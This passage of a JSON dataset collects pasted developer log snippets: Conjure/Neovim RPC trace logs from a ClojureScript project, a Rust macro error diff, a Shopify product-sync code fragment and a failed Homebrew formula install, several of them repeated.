{:tag :out, :val \"Open URL http://localhost:9500\\n\", :form nil}\r\n20-04-08 19:49:45 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :notify, :method :quick-doc, :params [0], :client :stdio}\r\n20-04-08 19:49:45 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-get-current-buf, :params nil}\r\n20-04-08 19:49:45 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result #msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x2b7a4451 \"[B@2b7a4451\"]}, :client :stdio}\r\n20-04-08 19:49:45 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_get_name\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x2b7a4451 \"[B@2b7a4451\"]}]] [\"nvim_buf_line_count\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x2b7a4451 \"[B@2b7a4451\"]}]] [\"nvim_buf_get_lines\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x2b7a4451 \"[B@2b7a4451\"]} 0 25 false]] [\"nvim_get_current_win\" []] [\"nvim_call_function\" [\"getcwd\" (0)]])]}\r\n20-04-08 19:49:45 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[\"/home/colin/projects/aok-elo-graph-front-end/src/aok_elo_graph_front_end/core.cljs\" 42 [\"(ns ^:figwheel-hooks aok-elo-graph-front-end.core\" \"  (:require\" \"   [goog.dom :as gdom]\" \"   [reagent.core :as reagent :refer [atom]]))\" \"\" \"(println \\\"This text is printed from src/aok_elo_graph_front_end/core.cljs. Go ahead and edit it and see reloading in action.\\\")\" \"\" \"(defn multiply [a b] (* a b))\" \"\" \"\" \";; define your app data so that it doesn't get over-written on reload\" \"(defonce app-state (atom {:text \\\"cats\\\"}))\" \"\" \"(defn get-app-element []\" \"  (gdom/getElement \\\"app\\\"))\" \"\" \"(defn hello-world []\" \"  [:div\" \"   [:h1 (:text @app-state)]\" \"   [:h3 \\\"Edit this in src/aok_elo_graph_front_end/core.cljs and watch it change!\\\"]])\" \"\" \"(defn mount [el]\" \"  (reagent/render-component [hello-world] el))\" \"\" \"(defn mount-app-element []\"] #msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x49b45589 \"[B@49b45589\"]} \"/home/colin/projects/aok-elo-graph-front-end\"] nil], :client :stdio}\r\n[Truncated]\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result #msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x17d81cf9 \"[B@17d81cf9\"]}, :client :stdio}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_get_name\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x17d81cf9 \"[B@17d81cf9\"]}]] [\"nvim_buf_line_count\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x17d81cf9 \"[B@17d81cf9\"]}]] [\"nvim_buf_get_lines\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x17d81cf9 \"[B@17d81cf9\"]} 0 25 false]] [\"nvim_get_current_win\" []] [\"nvim_call_function\" [\"getcwd\" (0)]])]}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[\"/tmp/conjure.cljc\" 2 [\"; conjure/out | Welcome to Conjure! (v2.1.2-2-gd3356a4de4)\" \"; conjure/up | Adding :pfig\"] #msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x24f3e46b \"[B@24f3e46b\"]} \"/home/colin/projects/aok-elo-graph-front-end\"] nil], :client :stdio}\r\n20-04-08 19:50:02 arch-desktop WARN [conjure.util:76] - Failed to parse code clojure.lang.ExceptionInfo: EOF while reading. {:type :reader-exception, :ex-kind :eof}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_get_current_buf\" []] [\"nvim_get_current_win\" []] [\"nvim_eval\" [\"matchstr(getline('.'), '\\\\%'.col('.').'c.')\"]] [\"nvim_call_function\" [\"searchpairpos\" (\"(\" \"\" \")\" \"bnzW\" \"!conjure#cursor_in_code()\")]] [\"nvim_call_function\" [\"searchpairpos\" (\"(\" \"\" \")\" \"nzW\" \"!conjure#cursor_in_code()\")]])]}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x62ded372 \"[B@62ded372\"]} #msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x57d0709b \"[B@57d0709b\"]} \";\" [0 0] [0 0]] nil], :client :stdio}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-win-get-cursor, :params [#msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x57d0709b \"[B@57d0709b\"]}]}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [2 0], :client :stdio}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [()]}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[] nil], :client :stdio}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-buf-clear-namespace, :params [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x17d81cf9 \"[B@17d81cf9\"]} 2 0 -1]}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result nil, :client :stdio}\r\n20-04-08 19:50:04 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :notify, :method :stop, :params [0], :client :stdio}\r\n20-04-08 19:50:04 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-get-current-buf, :params nil}\r\n20-04-08 19:50:04 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result #msgpack.core.Ext{:type 0, :data #object[\"[B\" 0xb8814c \"[B@b8814c\"]}, :client :stdio}\r\n20-04-08 19:50:04 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_get_name\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0xb8814c \"[B@b8814c\"]}]] [\"nvim_buf_line_count\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0xb8814c \"[B@b8814c\"]}]] [\"nvim_buf_get_lines\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0xb8814c \"[B@b8814c\"]} 0 25 false]] [\"nvim_get_current_win\" []] [\"nvim_call_function\" [\"getcwd\" (0)]])]}\r\n20-04-08 19:50:04 arch-desktop INFO [conjure.main:21] - Shutting down\r\n20-04-08 19:50:04 arch-desktop ERROR [conjure.rpc:?] - Error from thread 'RPC stdin handler': java.io.EOFException"
    },
    {
        "logs": "20-04-08 19:49:44 arch-desktop INFO [conjure.main:39] - Logging initialised\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.main:41] - System versions\r\n=== Conjure ===\r\nv2.1.2-2-gd3356a4de4\r\n\r\n=== OS ===\r\nLinux arch-desktop 5.4.6-arch1-1 #1 SMP PREEMPT Sat, 21 Dec 2019 16:34:41 +0000 x86_64 GNU/Linux\r\n\r\n=== Neovim ===\r\nNVIM v0.4.3\r\nBuild type: Release\r\nLuaJIT 2.0.5\r\nCompilation: /usr/bin/cc -march=x86-64 -mtune=generic -O2 -pipe -fno-plt -O2 -DNDEBUG -DMIN_LOG_LEVEL=3 -Wall -Wextra -pedantic -Wno-unused-parameter -Wstrict-prototypes -std=gnu99 -Wshadow -Wconversion -Wmissing-prototypes -Wimplicit-fallthrough -Wvla -fstack-protector-strong -fdiagnostics-color=always -DINCLUDE_GENERATED_DECLARATIONS -D_GNU_SOURCE -DNVIM_MSGPACK_HAS_FLOAT32 -DNVIM_UNIBI_HAS_VAR_FROM -I/build/neovim/src/build/config -I/build/neovim/src/neovim-0.4.3/src -I/usr/include -I/build/neovim/src/build/src/nvim/auto -I/build/neovim/src/build/include\r\nCompiled by builduser\r\n\r\nFeatures: +acl +iconv +tui\r\nSee \":help feature-compile\"\r\n\r\n   system vimrc file: \"$VIM/sysinit.vim\"\r\n  fall-back for $VIM: \"/usr/share/nvim\"\r\n\r\nRun :checkhealth for more info\r\n\r\n=== Java ===\r\nopenjdk version \"1.8.0_232\"\r\nOpenJDK Runtime Environment (build 1.8.0_232-b09)\r\nOpenJDK 64-Bit Server VM (build 25.232-b09, mixed mode)\r\n\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.rpc:195] - Starting RPC TCP server on port 39803\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.rpc:207] - Starting RPC loops\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.prepl:243] - Started prepl server on port 40361\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :notify, :method :up, :params [\"\"], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-set-var, :params [\"conjure_ready\" 1]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 2, :method :nvim-get-current-buf, :params nil}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result nil, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.main:46] - Everything's ready! Let's perform some magic.\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 2, :error nil, :result #msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]}, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_get_name\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]}]] [\"nvim_buf_line_count\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]}]] [\"nvim_buf_get_lines\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]} 0 25 false]] [\"nvim_get_current_win\" []] [\"nvim_call_function\" [\"getcwd\" (0)]])]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[\"/home/colin/projects/aok-elo-graph-front-end/src/aok_elo_graph_front_end/core.cljs\" 42 [\"(ns ^:figwheel-hooks aok-elo-graph-front-end.core\" \"  (:require\" \"   [goog.dom :as gdom]\" \"   [reagent.core :as reagent :refer [atom]]))\" \"\" \"(println \\\"This text is printed from src/aok_elo_graph_front_end/core.cljs. Go ahead and edit it and see reloading in action.\\\")\" \"\" \"(defn multiply [a b] (* a b))\" \"\" \"\" \";; define your app data so that it doesn't get over-written on reload\" \"(defonce app-state (atom {:text \\\"cats\\\"}))\" \"\" \"(defn get-app-element []\" \"  (gdom/getElement \\\"app\\\"))\" \"\" \"(defn hello-world []\" \"  [:div\" \"   [:h1 (:text @app-state)]\" \"   [:h3 \\\"Edit this in src/aok_elo_graph_front_end/core.cljs and watch it change!\\\"]])\" \"\" \"(defn mount [el]\" \"  (reagent/render-component [hello-world] el))\" \"\" \"(defn mount-app-element []\"] #msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x1253eb17 \"[B@1253eb17\"]} \"/home/colin/projects/aok-elo-graph-front-end\"] nil], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.prepl:131] - Adding :pfig 127.0.0.1 6776\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-get-var, :params [\"conjure_log_blacklist\"]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-execute-lua, :params [\"return require('conjure').upsert_log(...)\" (\"/tmp/conjure.cljc\" \"small\" false false true)]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :notify, :method :clear-virtual, :params [0], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 2, :method :nvim-get-current-buf, :params nil}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result {\"buf\" 3, \"win\" 1001}, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 2, :error nil, :result #msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x7dc6aec \"[B@7dc6aec\"]}, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_get_name\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x7dc6aec \"[B@7dc6aec\"]}]] [\"nvim_buf_line_count\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x7dc6aec \"[B@7dc6aec\"]}]] [\"nvim_buf_get_lines\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x7dc6aec \"[B@7dc6aec\"]} 0 25 false]] [\"nvim_get_current_win\" []] [\"nvim_call_function\" [\"getcwd\" (0)]])]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 2, :method :nvim-buf-line-count, :params [3]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[\"/home/colin/projects/aok-elo-graph-front-end/src/aok_elo_graph_front_end/core.cljs\" 42 [\"(ns ^:figwheel-hooks aok-elo-graph-front-end.core\" \"  (:require\" \"   [goog.dom :as gdom]\" \"   [reagent.core :as reagent :refer [atom]]))\" \"\" \"(println \\\"This text is printed from src/aok_elo_graph_front_end/core.cljs. Go ahead and edit it and see reloading in action.\\\")\" \"\" \"(defn multiply [a b] (* a b))\" \"\" \"\" \";; define your app data so that it doesn't get over-written on reload\" \"(defonce app-state (atom {:text \\\"cats\\\"}))\" \"\" \"(defn get-app-element []\" \"  (gdom/getElement \\\"app\\\"))\" \"\" \"(defn hello-world []\" \"  [:div\" \"   [:h1 (:text @app-state)]\" \"   [:h3 \\\"Edit this in src/aok_elo_graph_front_end/core.cljs and watch it change!\\\"]])\" \"\" \"(defn mount [el]\" \"  (reagent/render-component [hello-world] el))\" \"\" \"(defn mount-app-element []\"] #msgpack.core.Ext{:type 1, :data #object[\"[B\" 0xada2253 \"[B@ada2253\"]} \"/home/colin/projects/aok-elo-graph-front-end\"] nil], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 2, :error nil, :result 1, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_set_lines\" [3 0 1 false [\"; conjure/out | Welcome to Conjure! (v2.1.2-2-gd3356a4de4)\"]]] [\"nvim_buf_set_lines\" [3 -1 -1 false (\"; conjure/up | Adding :pfig\")]] [\"nvim_win_set_cursor\" [1001 [2 0]]])]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 2, :method :nvim-create-namespace, :params [\"conjure_virtual_text\"]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[nil nil nil] nil], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.prepl:64] - Connecting through remote-prepl :pfig\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-win-get-cursor, :params [#msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x1253eb17 \"[B@1253eb17\"]}]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 2, :error nil, :result 2, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [1 0], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 2, :method :nvim-buf-clear-namespace, :params [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x7dc6aec \"[B@7dc6aec\"]} 2 0 -1]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 2, :error nil, :result nil, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_clear_namespace\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]} 2 0 -1]] [\"nvim_buf_set_virtual_text\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]} 2 0 [[\"@> Assessing :pfig\" \"comment\"]] {}]])]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[nil 2] nil], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.prepl:151] - Fetching current deps.\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.prepl:68] - Read from remote-prepl :pfig - {:tag :out, :val \"Open URL http://localhost:9500\\n\", :form nil}\r\n20-04-08 19:49:45 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :notify, :method :quick-doc, :params [0], :client :stdio}\r\n20-04-08 19:49:45 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-get-current-buf, :params nil}\r\n20-04-08 19:49:45 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result #msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x2b7a4451 \"[B@2b7a4451\"]}, :client :stdio}\r\n20-04-08 19:49:45 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_get_name\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x2b7a4451 \"[B@2b7a4451\"]}]] [\"nvim_buf_line_count\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x2b7a4451 \"[B@2b7a4451\"]}]] [\"nvim_buf_get_lines\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x2b7a4451 \"[B@2b7a4451\"]} 0 25 false]] [\"nvim_get_current_win\" []] [\"nvim_call_function\" [\"getcwd\" (0)]])]}\r\n20-04-08 19:49:45 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[\"/home/colin/projects/aok-elo-graph-front-end/src/aok_elo_graph_front_end/core.cljs\" 42 [\"(ns ^:figwheel-hooks aok-elo-graph-front-end.core\" \"  (:require\" \"   [goog.dom :as gdom]\" \"   [reagent.core :as reagent :refer [atom]]))\" \"\" \"(println \\\"This text is printed from src/aok_elo_graph_front_end/core.cljs. Go ahead and edit it and see reloading in action.\\\")\" \"\" \"(defn multiply [a b] (* a b))\" \"\" \"\" \";; define your app data so that it doesn't get over-written on reload\" \"(defonce app-state (atom {:text \\\"cats\\\"}))\" \"\" \"(defn get-app-element []\" \"  (gdom/getElement \\\"app\\\"))\" \"\" \"(defn hello-world []\" \"  [:div\" \"   [:h1 (:text @app-state)]\" \"   [:h3 \\\"Edit this in src/aok_elo_graph_front_end/core.cljs and watch it change!\\\"]])\" \"\" \"(defn mount [el]\" \"  (reagent/render-component [hello-world] el))\" \"\" \"(defn mount-app-element []\"] #msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x49b45589 \"[B@49b45589\"]} \"/home/colin/projects/aok-elo-graph-front-end\"] nil], :client :stdio}\r\n[Truncated]\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result #msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x17d81cf9 \"[B@17d81cf9\"]}, :client :stdio}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_get_name\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x17d81cf9 \"[B@17d81cf9\"]}]] [\"nvim_buf_line_count\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x17d81cf9 \"[B@17d81cf9\"]}]] [\"nvim_buf_get_lines\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x17d81cf9 \"[B@17d81cf9\"]} 0 25 false]] [\"nvim_get_current_win\" []] [\"nvim_call_function\" [\"getcwd\" (0)]])]}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[\"/tmp/conjure.cljc\" 2 [\"; conjure/out | Welcome to Conjure! (v2.1.2-2-gd3356a4de4)\" \"; conjure/up | Adding :pfig\"] #msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x24f3e46b \"[B@24f3e46b\"]} \"/home/colin/projects/aok-elo-graph-front-end\"] nil], :client :stdio}\r\n20-04-08 19:50:02 arch-desktop WARN [conjure.util:76] - Failed to parse code clojure.lang.ExceptionInfo: EOF while reading. {:type :reader-exception, :ex-kind :eof}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_get_current_buf\" []] [\"nvim_get_current_win\" []] [\"nvim_eval\" [\"matchstr(getline('.'), '\\\\%'.col('.').'c.')\"]] [\"nvim_call_function\" [\"searchpairpos\" (\"(\" \"\" \")\" \"bnzW\" \"!conjure#cursor_in_code()\")]] [\"nvim_call_function\" [\"searchpairpos\" (\"(\" \"\" \")\" \"nzW\" \"!conjure#cursor_in_code()\")]])]}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x62ded372 \"[B@62ded372\"]} #msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x57d0709b \"[B@57d0709b\"]} \";\" [0 0] [0 0]] nil], :client :stdio}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-win-get-cursor, :params [#msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x57d0709b \"[B@57d0709b\"]}]}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [2 0], :client :stdio}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [()]}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[] nil], :client :stdio}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-buf-clear-namespace, :params [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x17d81cf9 \"[B@17d81cf9\"]} 2 0 -1]}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result nil, :client :stdio}\r\n20-04-08 19:50:04 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :notify, :method :stop, :params [0], :client :stdio}\r\n20-04-08 19:50:04 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-get-current-buf, :params nil}\r\n20-04-08 19:50:04 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result #msgpack.core.Ext{:type 0, :data #object[\"[B\" 0xb8814c \"[B@b8814c\"]}, :client :stdio}\r\n20-04-08 19:50:04 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_get_name\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0xb8814c \"[B@b8814c\"]}]] [\"nvim_buf_line_count\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0xb8814c \"[B@b8814c\"]}]] [\"nvim_buf_get_lines\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0xb8814c \"[B@b8814c\"]} 0 25 false]] [\"nvim_get_current_win\" []] [\"nvim_call_function\" [\"getcwd\" (0)]])]}\r\n20-04-08 19:50:04 arch-desktop INFO [conjure.main:21] - Shutting down\r\n20-04-08 19:50:04 arch-desktop ERROR [conjure.rpc:?] - Error from thread 'RPC stdin handler': java.io.EOFException"
    },
    {
        "logs": "diff\r\n1\terror: no rules expected the token `,`\r\n-\t  --> $DIR/vec-macro-with-comma-only.rs:2:5\r\n+\t  --> $DIR/vec-macro-with-comma-only.rs:2:10\r\n3\t   |\r\n4\tLL |     vec![,];\r\n5\t   |          ^ no rules expected this token in macro call"
    },
    {
        "logs": ",\r\n  method: 'GET',\r\n  headers: shopifyConfig,\r\n}).catch(\r\n  function (error) {\r\n    console.info('This Product is not in the sales channel for this app!', error)\r\n\r\n    return res\r\n        \r\n       \r\n  }\r\n)\r\nconsole.log('Checking sales channel sync data...', id)\r\n\r\n\r\n // Check Channel found\r\n if (!shopifyChannelProduct) {\r\n  console.warn('NOT HERE')\r\n  return res\r\n   \r\n  \r\n  // No changes found\r\n} else {\r\n  console.info('Product is here continue to sync.')\r\n  "
    },
    {
        "logs": ",\r\n  method: 'GET',\r\n  headers: shopifyConfig,\r\n}).catch(\r\n  function (error) {\r\n    console.info('This Product is not in the sales channel for this app!', error)\r\n\r\n    return res\r\n        \r\n       \r\n  }\r\n)\r\nconsole.log('Checking sales channel sync data...', id)\r\n\r\n\r\n // Check Channel found\r\n if (!shopifyChannelProduct) {\r\n  console.warn('NOT HERE')\r\n  return res\r\n   \r\n  \r\n  // No changes found\r\n} else {\r\n  console.info('Product is here continue to sync.')\r\n  \r\n}"
    },
    {
        "logs": "brew install valet-php@7.4.rb  --build-from-source\r\nUpdating Homebrew...\r\n==> Auto-updated Homebrew!\r\nUpdated 3 taps (homebrew/core, homebrew/cask and homebrew/services).\r\n==> New Formulae\r\nlibrist                 osc-cli                 selene                  solana                  vespa-cli\r\n==> Updated Formulae\r\nUpdated 362 formulae.\r\n==> New Casks\r\nepilogue-operator             mathcha-notebook              nimblenote                    remotion\r\n==> Updated Casks\r\nUpdated 158 casks.\r\n\r\nError: valet-php@7.4: /Users/username_3/valet-php@7.4.rb:7: syntax error, unexpected '<'\r\n<!DOCTYPE html>\r\n^\r\n/Users/username_3/valet-php@7.4.rb:8: syntax error, unexpected '<'\r\n<html lang=\"en\" data-color-mod...\r\n^\r\n/Users/username_3/valet-php@7.4.rb:8: syntax error, unexpected tIDENTIFIER, expecting end-of-input\r\n<html lang=\"en\" data-color-mode=\"auto\" data-light...\r\n                ^~~~"
    },
    {
        "logs": "brew install valet-php@7.4.rb  --build-from-source\r\nUpdating Homebrew...\r\n==> Auto-updated Homebrew!\r\nUpdated 3 taps (homebrew/core, homebrew/cask and homebrew/services).\r\n==> New Formulae\r\nlibrist                 osc-cli                 selene                  solana                  vespa-cli\r\n==> Updated Formulae\r\nUpdated 362 formulae.\r\n==> New Casks\r\nepilogue-operator             mathcha-notebook              nimblenote                    remotion\r\n==> Updated Casks\r\nUpdated 158 casks.\r\n\r\nError: valet-php@7.4: /Users/username_3/valet-php@7.4.rb:7: syntax error, unexpected '<'\r\n<!DOCTYPE html>\r\n^\r\n/Users/username_3/valet-php@7.4.rb:8: syntax error, unexpected '<'\r\n<html lang=\"en\" data-color-mod...\r\n^\r\n/Users/username_3/valet-php@7.4.rb:8: syntax error, unexpected tIDENTIFIER, expecting end-of-input\r\n<html lang=\"en\" data-color-mode=\"auto\" data-light...\r\n                ^~~~"
    },
    {
